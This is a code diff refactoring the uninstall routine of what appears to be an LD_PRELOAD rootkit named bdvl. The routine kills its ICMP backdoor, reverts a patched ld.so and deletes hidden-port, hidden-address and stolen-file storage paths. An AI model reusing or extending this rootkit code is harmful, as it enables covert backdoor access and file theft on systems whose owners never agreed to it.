@@ -1,3 +1,4 @@
+/* recursively removes the target directory. */
 void eradicatedir(const char *target){
     DIR *dp;
     struct dirent *dir;
@@ -29,6 +30,10 @@ void eradicatedir(const char *target){
 }
 
 #ifdef UNINSTALL_MY_ASS
+/* read each line in the contents of ASS_PATH.
+ * if the line is a hidden path, i.e. one of ours,
+ * remove it. if it is a directory, it will be removed recursively
+ * by the function eradicatedir. */
 void uninstallass(void){
     FILE *fp;
     struct stat assstat, assdirstat;
@@ -74,6 +79,8 @@ void uninstallass(void){
 }
 #endif
 
+
+
 void rmbdvpaths(void){
     char *src, *dest;
     int ulr;
@@ -101,40 +108,10 @@ void rmbdvpaths(void){
         if(rm(src) < 0) printf("Failed removing %s\n", src);
     }
 
-#if defined FILE_STEAL && defined CLEANEDTIME_PATH
-    if(rm(CLEANEDTIME_PATH) < 0)
-        printf("Failed removing CLEANEDTIME_PATH\n");
-#endif
-#ifdef HIDE_PORTS
-    if(rm(HIDEPORTS) < 0)
-        printf("Failed removing hide_ports\n");
-#endif
-#ifdef HIDE_ADDRS
-    if(rm(HIDEADDRS) < 0)
-        printf("Failed removing hide_addrs\n");
-#endif
-}
-
-void uninstallbdv(void){
-    dorolf();
-#ifdef USE_ICMP_BD
-    if(pdoorup()){
-        printf("Killing ICMP backdoor\n");
-        killrkprocs(readgid()-1);
-    }
-#endif
-#ifdef PATCH_DYNAMIC_LINKER
-    printf("Reverting ld.so\n");
-    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
-#endif
-    printf("Eradicating directories\n");
-    eradicatedir(INSTALL_DIR);
-    eradicatedir(HOMEDIR);
 #ifdef UNINSTALL_MY_ASS
     printf("Uninstalling your ass\n");
     uninstallass();
 #endif
-
     char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
     preloadpath = PRELOAD_FILE;
@@ -143,10 +120,7 @@ void uninstallbdv(void){
     if(rm(preloadpath) < 0)
         printf("Failed removing preload file\n");
 
-    printf("Removing bdvl paths\n");
-    rmbdvpaths();
-
-#if defined FILE_STEAL && defined CLEANEDTIME_PATH
+#if defined FILE_STEAL && defined FILE_CLEANSE_TIMER
     if(rm(CLEANEDTIME_PATH) < 0)
         printf("Failed removing CLEANEDTIME_PATH\n");
 #endif
@@ -158,6 +132,36 @@ void uninstallbdv(void){
     if(rm(HIDEADDRS) < 0)
         printf("Failed removing hide_addrs\n");
 #endif
+#ifdef STOLEN_STORAGE
+    if(rm(STOLESTORE_PATH) < 0)
+        printf("Failed removing STOLESTORE_PATH\n");
+#endif
+}
+
+
+
+
+void uninstallbdv(void){
+    dorolf();
+
+#ifdef USE_ICMP_BD
+    if(pdoorup()){
+        printf("Killing ICMP backdoor\n");
+        killrkprocs(readgid()-1);
+    }
+#endif
+
+#ifdef PATCH_DYNAMIC_LINKER
+    printf("Reverting ld.so\n");
+    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
+#endif
+
+    printf("Eradicating directories\n");
+    eradicatedir(INSTALL_DIR);
+    eradicatedir(HOMEDIR);
+
+    printf("Removing bdvl paths\n");
+    rmbdvpaths();
 
     printf("Done.\n");
 }
